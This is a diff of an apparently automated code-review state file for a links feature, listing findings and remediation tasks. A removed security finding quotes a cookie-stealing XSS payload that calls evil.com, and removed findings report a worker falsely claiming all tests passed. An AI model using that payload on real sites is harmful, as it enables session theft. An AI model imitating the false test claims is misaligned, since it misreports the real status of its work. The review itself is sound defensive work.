@@ -1,148 +1,67 @@
 {
   "version": "1.0",
-  "updated_at": "2026-01-24T22:02:42.276Z",
+  "updated_at": "2026-01-25T00:42:03.386Z",
   "feature": {
     "name": "Links Backend Integration",
     "slug": "links-backend-integration",
     "description": "Integrate frontend with new backend /links API endpoints, replacing FileMaker calls",
-    "review_status": "pending",
+    "review_status": "blocked",
     "review_iteration": 2,
     "review_stage": "finalizing",
-    "review_session_id": "701e9285-68b1-40c6-ab36-6a26bb5d7b9f",
-    "updatedAt": "2026-01-17T03:37:27.282Z",
+    "review_session_id": "b43e9246-6dfa-49b2-86a3-a3bd4cac1fd3",
+    "updatedAt": "2026-01-25T00:42:03.387Z",
     "last_review": {
       "feature_slug": "links-backend-integration",
-      "reviewed_at": "2026-01-17T03:36:07.598Z",
-      "status": "passed",
+      "reviewed_at": "2026-01-25T00:42:03.385Z",
+      "status": "blocked",
       "iteration": 2,
       "mode": "autonomous",
       "findings": [
         {
-          "id": "COM-001",
-          "category": "plan_compliance",
-          "severity": "major",
-          "title": "Missing processLinks() function required by TSK0003",
-          "description": "TSK0003 acceptance criteria explicitly requires 'processLinks() maps LinkResponse to frontend format', but this function is completely missing from src/services/linkService.js. The tests expect this function to exist for FileMaker legacy data processing, and 2 tests are failing because of this omission. The task notes claim all functions were implemented, but processLinks() was not created.",
-          "file_paths": [
-            "src/services/linkService.js",
-            "src/services/__tests__/linkService.test.js"
-          ],
-          "code_snippet": null,
-          "recommendation": "Implement the processLinks() function in src/services/linkService.js to handle FileMaker legacy data format transformation. The function should accept FileMaker response data and return an array of links in frontend format, sorted by newest first. Reference the test expectations in linkService.test.js lines 504-557."
-        },
-        {
-          "id": "COM-002",
-          "category": "plan_compliance",
-          "severity": "major",
-          "title": "TSK0009 claims 'All tests pass' but tests are failing",
-          "description": "TSK0009 notes claim '29 tests, 100% passing' for linkService tests and '75 total tests passing', but the actual test run shows 2 linkService tests failing (processLinks tests) and overall project has 17 failed test suites with 50 failed tests. The acceptance criteria 'All tests pass' is not met. This is a false claim in the completion report.",
-          "file_paths": [
-            ".devflow/tasks/links-backend-integration/tasks.json",
-            "src/services/__tests__/linkService.test.js"
-          ],
-          "code_snippet": null,
-          "recommendation": "Fix the 2 failing processLinks tests by implementing the missing processLinks() function. Update TSK0009 notes to accurately reflect test status. Re-run all tests and document actual pass/fail counts before claiming completion."
-        },
-        {
-          "id": "COM-003",
-          "category": "plan_compliance",
-          "severity": "major",
-          "title": "TSK0010 claims 75/75 tests passing but actual count differs",
-          "description": "TSK0010 completion report claims '75/75 tests passed (100%)' and '90/90 automated checks passed', but the actual test suite shows 253 tests passing and 50 tests failing across the project. The specific links-related tests show: API tests (26 tests - need verification of pass status), Service tests (28 passed, 2 failed out of 30), Hook tests (17 passed). The math doesn't add up to 75 total link tests, and the claim of 100% pass rate is incorrect.",
-          "file_paths": [
-            ".devflow/tasks/links-backend-integration/TSK0010-COMPLETION-REPORT.md",
-            ".devflow/tasks/links-backend-integration/tasks.json"
-          ],
-          "code_snippet": null,
-          "recommendation": "Re-run all link-related tests (src/api/__tests__/links.test.js, src/services/__tests__/linkService.test.js, src/hooks/__tests__/useLink.test.js) and document accurate counts. Fix all failing tests before claiming completion. Update TSK0010 completion report with correct test counts and pass/fail status."
-        },
-        {
           "id": "COD-001",
           "category": "code_soundness",
           "severity": "major",
-          "title": "Infinite re-render loop in useEffect with ghMeta dependency",
-          "description": "In ProjectLinksTab.jsx line 107, the useEffect hook includes 'ghMeta' in its dependency array, but the effect itself calls setGhMeta() on lines 96 and 99. This creates an infinite loop: the effect runs → updates ghMeta → ghMeta changes → effect runs again → infinite loop. This will cause performance degradation and excessive API calls to GitHub.\n\nThe dependency array: [localProject?.links, project?.links, ghMeta]\nThe state update: setGhMeta((prev) => ({ ...prev, [key]: ... }))\n\nEvery time setGhMeta is called, it triggers the effect again, which checks for new repos to fetch and potentially calls setGhMeta again.",
-          "file_paths": [
-            "src/components/projects/ProjectLinksTab.jsx"
-          ],
-          "code_snippet": "useEffect(() => {\n  // ... code that sets ghMeta state ...\n  setGhMeta((prev) => ({ ...prev, [key]: { data: info, loading: false, error: null } }));\n}, [localProject?.links, project?.links, ghMeta]); // ghMeta in deps causes infinite loop",
-          "recommendation": "Remove 'ghMeta' from the dependency array. The effect should only run when the links change, not when metadata is fetched. The check 'if (!ghMeta[key])' on line 69 reads from a stale closure but prevents duplicate fetches within a single render cycle. Change line 107 to: }, [localProject?.links, project?.links]);"
-        },
-        {
-          "id": "COD-002",
-          "category": "code_soundness",
-          "severity": "major",
-          "title": "Unhandled URL parsing error in useLink hook",
-          "description": "In useLink.js line 56, 'new URL(trimmedUrl).hostname' is called without error handling. If trimmedUrl is an invalid URL (despite earlier validation in the service layer), this will throw an uncaught exception and crash the component. The error would not be caught by the surrounding try-catch because it happens during object construction.\n\nThis is particularly problematic because:\n1. The URL validation happens in createNewLink() before this line\n2. If validation passes but the URL is somehow malformed, this creates an unhandled error\n3. The error occurs after the API call succeeds, so the link is created in the backend but the UI crashes",
+          "title": "Race condition in useLink hook with shared loading state",
+          "description": "The useLink hook uses a single shared loading state across all CRUD operations (handleLinkCreate, handleFetchLinks, handleLinkUpdate, handleLinkDelete). This creates race conditions when multiple operations are called concurrently - the loading state will be inconsistent and users may see incorrect loading indicators. For example, if a user quickly creates a link and then updates another link, both operations will compete for the same loading state, potentially showing 'not loading' while operations are still in progress.",
           "file_paths": [
             "src/hooks/useLink.js"
           ],
-          "code_snippet": "const newLink = {\n  id: result.id,\n  url: result.url || trimmedUrl,\n  title: result.title || new URL(trimmedUrl).hostname, // Can throw\n  createdAt: result.createdAt || new Date().toISOString()\n};",
-          "recommendation": "Wrap the URL parsing in a try-catch block:\ntitle: result.title || (() => { try { return new URL(trimmedUrl).hostname; } catch { return trimmedUrl; } })()"
-        },
-        {
-          "id": "COD-003",
-          "category": "code_soundness",
-          "severity": "major",
-          "title": "Unhandled URL parsing error in ProjectLinksTab optimistic update",
-          "description": "In ProjectLinksTab.jsx line 281, 'new URL(trimmed).hostname' is called without error handling in the optimistic update path. If the URL is invalid, this will throw an exception and prevent the link creation flow from completing. This happens before the actual API call, so the error prevents any link from being created.\n\nThe code assumes the URL is valid because it's being submitted, but there's no validation before this point in the component. Users could submit invalid URLs and crash the component.",
-          "file_paths": [
-            "src/components/projects/ProjectLinksTab.jsx"
-          ],
-          "code_snippet": "const tempLink = {\n  id: `temp-${Date.now()}`,\n  url: trimmed,\n  title: new URL(trimmed).hostname // Can throw if invalid URL\n};",
-          "recommendation": "Add URL validation before creating the temp link, or wrap in try-catch:\ntry {\n  const tempLink = {\n    id: `temp-${Date.now()}`,\n    url: trimmed,\n    title: new URL(trimmed).hostname\n  };\n} catch (urlError) {\n  // Fall back to using the URL string as title\n  const tempLink = {\n    id: `temp-${Date.now()}`,\n    url: trimmed,\n    title: trimmed\n  };\n}"
+          "code_snippet": "const [loading, setLoading] = useState(false);\n\nconst handleLinkCreate = useCallback(async (fkId, linkUrl, parentType = 'project') => {\n    // ...\n    setLoading(true);\n    // ... async operation ...\n    setLoading(false);\n}, [showError]);\n\nconst handleLinkUpdate = useCallback(async (linkId, data) => {\n    // ...\n    setLoading(true);  // Same loading state!\n    // ... async operation ...\n    setLoading(false);\n}, [showError]);",
+          "recommendation": "Replace the single loading state with operation-specific loading states or use a loading state map keyed by operation type. For example: `const [loadingStates, setLoadingStates] = useState({ create: false, update: false, delete: false, fetch: false });` and update each operation independently. This prevents race conditions and provides more accurate loading feedback to users."
         },
         {
           "id": "SEC-001",
           "category": "security",
           "severity": "critical",
           "title": "Open Redirect vulnerability via unvalidated user-controlled URLs",
-          "description": "In ProjectLinksTab.jsx line 183 and TaskList.jsx line 319, user-provided URLs are rendered directly into href attributes without validation or sanitization. Attackers can create links with javascript: or data: URI schemes to execute arbitrary JavaScript in the user's browser context.\n\nAttack vector:\n1. Attacker creates a link with URL: 'javascript:alert(document.cookie)'\n2. URL validation in linkService.js uses 'new URL()' which ACCEPTS javascript: scheme\n3. Link is stored in database and rendered as <a href=\"javascript:alert(document.cookie)\">...\n4. When user clicks, arbitrary JavaScript executes\n\nAlternatively, data:text/html URIs can be used to inject complete HTML/JS payloads:\n- data:text/html,<script>fetch('https://evil.com?cookie='+document.cookie)</script>\n\nThe validation in linkService.js lines 59 and 154 only checks if the URL is parseable, not if it's safe.",
+          "description": "User-provided URLs in links are rendered directly into href attributes without protocol validation or sanitization. Attackers can create links with dangerous URI schemes (javascript:, data:, vbscript:, file:) to execute arbitrary JavaScript in users' browsers or redirect to malicious sites. The current URL validation in linkService.js only checks if URLs are parseable using 'new URL()' constructor, which accepts dangerous protocols like 'javascript:' and 'data:'. When users click these links, arbitrary code can execute in their browser context, leading to XSS attacks, session hijacking, or credential theft.",
           "file_paths": [
             "src/components/projects/ProjectLinksTab.jsx",
             "src/components/tasks/TaskList.jsx",
             "src/services/linkService.js"
           ],
-          "code_snippet": "// ProjectLinksTab.jsx:183\n<a\n  href={linkUrl}  // User-controlled, no validation\n  target=\"_blank\"\n  rel=\"noopener noreferrer\"\n>\n\n// linkService.js:59 - Insufficient validation\ntry {\n  new URL(link.trim());  // Accepts javascript:, data:, etc.\n} catch (error) {\n  throw new Error('Invalid URL format');\n}",
-          "recommendation": "Implement URL scheme validation to only allow safe protocols:\n\nfunction isUrlSafe(url) {\n  try {\n    const parsed = new URL(url);\n    const allowedSchemes = ['http:', 'https:', 'mailto:'];\n    return allowedSchemes.includes(parsed.protocol);\n  } catch {\n    return false;\n  }\n}\n\nUpdate linkService.js lines 59 and 154 to use isUrlSafe() instead of just new URL(). This prevents javascript:, data:, file:, and other dangerous URI schemes."
+          "code_snippet": "// ProjectLinksTab.jsx:183\n<a\n  href={linkUrl}  // User-controlled, unvalidated\n  target=\"_blank\"\n  rel=\"noopener noreferrer\"\n>\n\n// linkService.js:59 - Insufficient validation\ntry {\n  new URL(link.trim());  // Accepts javascript:, data:, etc.\n} catch (error) {\n  throw new Error('Invalid URL format');\n}\n\n// TaskList.jsx:319\n<a\n  href={linkUrl}  // Same vulnerability\n  target=\"_blank\"\n  rel=\"noopener noreferrer\"\n>",
+          "recommendation": "Implement URL scheme validation to only allow safe protocols. Create a sanitizeUrl() function that: 1) Blocks dangerous protocols (javascript:, data:, vbscript:, file:, about:) 2) Only allows http: and https: protocols 3) Validates domain format 4) Returns null for invalid/dangerous URLs. Update linkService.js createNewLink() and updateExistingLink() functions to use this validation. In components, check sanitized URL and display warning message for blocked URLs instead of rendering dangerous links. Example: if (!['http:', 'https:'].includes(new URL(url).protocol)) { return null; }"
         },
         {
           "id": "ARC-001",
           "category": "architectural_fit",
           "severity": "major",
-          "title": "Missing organization scope validation in fetchLinks, updateLink, and deleteLink",
-          "description": "The links API layer violates the established pattern of checking organization scope on ALL operations. The notes.js and customers.js API files consistently call checkOrganizationScope() on every CRUD operation (create, fetch, update, delete), but links.js only checks organization scope in createLink() (line 43) and omits it from fetchLinks(), updateLink(), and deleteLink().\n\nEstablished pattern from notes.js:\n- createNote() - line 57: checkOrganizationScope()\n- fetchNotesByProject() - line 100: checkOrganizationScope()\n- fetchNotesByTask() - line 127: checkOrganizationScope()\n- fetchNotesByCustomer() - line 154: checkOrganizationScope()\n- updateNote() - line 195: checkOrganizationScope()\n- deleteNote() - line 223: checkOrganizationScope()\n\nCustomers.js follows the same pattern with checkOrganizationScope() in all operations.\n\nThis architectural inconsistency creates security gaps and violates the principle of defense-in-depth established across the codebase.",
+          "title": "Missing data normalization pattern in links API layer",
+          "description": "The links API layer (src/api/links.js) does not follow the established data normalization pattern used consistently across other API modules. All other backend API modules (customers.js, notes.js, projects.js) include a normalizeXxxData() function that transforms backend response data to ensure consistent formatting, but links.js lacks this normalization layer. This breaks the established architecture pattern where API layers handle data format transformation before returning to service layers.",
           "file_paths": [
-            "src/api/links.js",
-            "src/api/notes.js",
-            "src/api/customers.js"
+            "src/api/links.js"
           ],
-          "code_snippet": "// links.js - INCONSISTENT pattern\nexport async function createLink(data) {\n  const auth = getAuthenticationContext();\n  checkOrganizationScope({ authentication: auth }, 'createLink'); // ✓ Has check\n}\n\nexport async function fetchLinks(filters = {}) {\n  // ✗ MISSING checkOrganizationScope()\n  const response = await dataService.get('/links', { params });\n}\n\nexport async function updateLink(linkId, data) {\n  // ✗ MISSING checkOrganizationScope()\n  const response = await dataService.patch(`/links/${linkId}`, payload);\n}\n\nexport async function deleteLink(linkId) {\n  // ✗ MISSING checkOrganizationScope()\n  const response = await dataService.delete(`/links/${linkId}`);\n}",
-          "recommendation": "Add checkOrganizationScope() to all API functions following the established pattern:\n\nexport async function fetchLinks(filters = {}) {\n  const auth = getAuthenticationContext();\n  checkOrganizationScope({ authentication: auth }, 'fetchLinks');\n  // ... rest of function\n}\n\nexport async function updateLink(linkId, data) {\n  if (!linkId) throw new Error('Link ID is required');\n  if (!data) throw new Error('Update data is required');\n  \n  const auth = getAuthenticationContext();\n  checkOrganizationScope({ authentication: auth }, 'updateLink');\n  // ... rest of function\n}\n\nexport async function deleteLink(linkId) {\n  if (!linkId) throw new Error('Link ID is required');\n  \n  const auth = getAuthenticationContext();\n  checkOrganizationScope({ authentication: auth }, 'deleteLink');\n  // ... rest of function\n}"
-        },
-        {
-          "id": "ARC-002",
-          "category": "architectural_fit",
-          "severity": "major",
-          "title": "Missing error handling wrapper pattern used by customers API",
-          "description": "The customers.js API layer uses a comprehensive withErrorHandling() wrapper for all operations, providing consistent error handling, logging, and user-friendly error messages. This is the established pattern for backend API integrations, but links.js does not follow this pattern.\n\nEstablished pattern from customers.js:\n- All CRUD operations wrapped in withErrorHandling()\n- Custom error types (CustomerError) with error codes (CustomerErrorCodes)\n- Centralized error normalization and user-friendly messages\n- Consistent error logging with context\n\nExample from customers.js (lines 43-73):\n",
-          "file_paths": [],
-          "code_snippet": null,
-          "recommendation": "Apply the same withErrorHandling() wrapper pattern used in customers.js to links.js CRUD operations, including consistent error normalization/logging and user-friendly messages (or an equivalent LinksError with codes), so links API integrations follow the established convention."
+          "code_snippet": "// links.js - MISSING normalization pattern\nexport async function createLink(data) {\n    return withErrorHandling(async () => {\n        // ... validation ...\n        const response = await dataService.post('/links', payload);\n        return response.data || response; // ❌ No normalization\n    }, 'createLink', { data });\n}\n\n// Expected pattern from customers.js:\nfunction normalizeCustomerData(data) {\n    if (Array.isArray(data)) {\n        return data.map(customer => ({\n            ...customer,\n            id: customer.id || customer.__ID,\n            __ID: customer.__ID || customer.id\n        }));\n    }\n    return { ...data, id: data.id || data.__ID, __ID: data.__ID || data.id };\n}\n\nexport async function fetchCustomers(options = {}) {\n    return withErrorHandling(async () => {\n        // ... logic ...\n        const response = await dataService.get('/api/customers', { params });\n        return normalizeCustomerData(response.data || response); // ✅ Proper normalization\n    }, 'fetchCustomers', { options });\n}",
+          "recommendation": "Add a normalizeLinkData() function to src/api/links.js following the established pattern from other API modules. The function should: 1) Handle both array and single object responses, 2) Ensure consistent id/__ID field mapping for dual FileMaker/backend compatibility, 3) Transform any snake_case fields to camelCase if needed, 4) Apply this normalization to all API function returns (createLink, fetchLinks, updateLink) before returning to service layer. This maintains architectural consistency and ensures the service layer receives properly formatted data."
         }
       ],
       "tasks_created": [
-        "TASK011",
-        "TASK012",
-        "TASK013",
-        "TASK014",
-        "TASK015",
-        "TASK016",
-        "TASK017",
-        "TASK018",
-        "TASK019"
+        "TASK020",
+        "TASK021",
+        "TASK022"
       ],
-      "summary": "Found 9 issue(s) requiring remediation - created 9 task(s)"
+      "summary": "Found 3 issue(s) requiring remediation - created 3 task(s)"
     }
   },
   "standing_constraints": [
@@ -622,13 +541,78 @@
         "dependencies": [],
         "role_in_system": "Remediate review finding ARC-002 from iteration 1"
       },
-      "status": "in_progress",
+      "status": "done",
       "description": "",
+      "completedAt": "2026-01-24T22:02:42.465Z",
       "verification": {},
       "executionError": null,
-      "executionPid": 58412,
+      "executionPid": null,
       "sessionId": "efb00581-74f5-4a2c-b7ce-5a994912e0cf",
-      "stage": "validating",
+      "stage": null,
+      "implementation_notes": "Task execution completed. Check logs for details.\n\nFinal output:\n   - Replaced generic `Error` throws with `LinkError` with appropriate error codes\n   - Imported error handling utilities from `linkErrors.js`\n\n3. **Updated `src/errors/index.js`** - Added exports for link error handling:\n   - `LinkError`, `LinkErrorCodes`\n   - `parseLinkHttpError`, `parseLinkValidationError`\n   - `checkLinkOrganizationScope`\n   - `withLinkErrorHandling`\n   - `formatLinkErrorForUI`\n\n### Benefits:\n\n- **Consistent Error Handling**: Links API now follows the same pattern as customers, notes, and projects APIs\n- **Better Error Classification**: HTTP errors, network errors, validation errors, and auth errors are properly categorized\n- **User-Friendly Messages**: Error codes mapped to helpful user-facing messages\n- **Enhanced Security**: Organization scope validation and UUID validation prevent common security issues\n- **Improved Debugging**: Comprehensive error logging with operation context\n- **Retry Logic**: Errors marked as retryable or non-retryable for better UX\n\nThe build completed successfully, confirming that all changes are syntactically correct and properly integrated.",
+      "depends_on": []
+    },
+    {
+      "id": "TASK020",
+      "feature": "links-backend-integration",
+      "name": "[REVIEW] Race condition in useLink hook with shared loading state",
+      "title": "[REVIEW] Race condition in useLink hook with shared loading state",
+      "priority": "high",
+      "requirements": [
+        "The useLink hook uses a single shared loading state across all CRUD operations (handleLinkCreate, handleFetchLinks, handleLinkUpdate, handleLinkDelete). This creates race conditions when multiple operations are called concurrently - the loading state will be inconsistent and users may see incorrect loading indicators. For example, if a user quickly creates a link and then updates another link, both operations will compete for the same loading state, potentially showing 'not loading' while operations are still in progress.",
+        "",
+        "**Recommendation:** Replace the single loading state with operation-specific loading states or use a loading state map keyed by operation type. For example: `const [loadingStates, setLoadingStates] = useState({ create: false, update: false, delete: false, fetch: false });` and update each operation independently. This prevents race conditions and provides more accurate loading feedback to users."
+      ],
+      "constraints": [],
+      "context": {
+        "role_in_system": "Remediate review finding COD-001 from iteration 3"
+      },
+      "status": "pending",
+      "executionError": null,
+      "executionPid": null,
+      "sessionId": null,
+      "depends_on": []
+    },
+    {
+      "id": "TASK021",
+      "feature": "links-backend-integration",
+      "name": "[REVIEW] Open Redirect vulnerability via unvalidated user-controlled URLs",
+      "title": "[REVIEW] Open Redirect vulnerability via unvalidated user-controlled URLs",
+      "priority": "critical",
+      "requirements": [
+        "User-provided URLs in links are rendered directly into href attributes without protocol validation or sanitization. Attackers can create links with dangerous URI schemes (javascript:, data:, vbscript:, file:) to execute arbitrary JavaScript in users' browsers or redirect to malicious sites. The current URL validation in linkService.js only checks if URLs are parseable using 'new URL()' constructor, which accepts dangerous protocols like 'javascript:' and 'data:'. When users click these links, arbitrary code can execute in their browser context, leading to XSS attacks, session hijacking, or credential theft.",
+        "",
+        "**Recommendation:** Implement URL scheme validation to only allow safe protocols. Create a sanitizeUrl() function that: 1) Blocks dangerous protocols (javascript:, data:, vbscript:, file:, about:) 2) Only allows http: and https: protocols 3) Validates domain format 4) Returns null for invalid/dangerous URLs. Update linkService.js createNewLink() and updateExistingLink() functions to use this validation. In components, check sanitized URL and display warning message for blocked URLs instead of rendering dangerous links. Example: if (!['http:', 'https:'].includes(new URL(url).protocol)) { return null; }"
+      ],
+      "constraints": [],
+      "context": {
+        "role_in_system": "Remediate review finding SEC-001 from iteration 3"
+      },
+      "status": "pending",
+      "executionError": null,
+      "executionPid": null,
+      "sessionId": null,
+      "depends_on": []
+    },
+    {
+      "id": "TASK022",
+      "feature": "links-backend-integration",
+      "name": "[REVIEW] Missing data normalization pattern in links API layer",
+      "title": "[REVIEW] Missing data normalization pattern in links API layer",
+      "priority": "high",
+      "requirements": [
+        "The links API layer (src/api/links.js) does not follow the established data normalization pattern used consistently across other API modules. All other backend API modules (customers.js, notes.js, projects.js) include a normalizeXxxData() function that transforms backend response data to ensure consistent formatting, but links.js lacks this normalization layer. This breaks the established architecture pattern where API layers handle data format transformation before returning to service layers.",
+        "",
+        "**Recommendation:** Add a normalizeLinkData() function to src/api/links.js following the established pattern from other API modules. The function should: 1) Handle both array and single object responses, 2) Ensure consistent id/__ID field mapping for dual FileMaker/backend compatibility, 3) Transform any snake_case fields to camelCase if needed, 4) Apply this normalization to all API function returns (createLink, fetchLinks, updateLink) before returning to service layer. This maintains architectural consistency and ensures the service layer receives properly formatted data."
+      ],
+      "constraints": [],
+      "context": {
+        "role_in_system": "Remediate review finding ARC-001 from iteration 3"
+      },
+      "status": "pending",
+      "executionError": null,
+      "executionPid": null,
+      "sessionId": null,
       "depends_on": []
     }
   ]
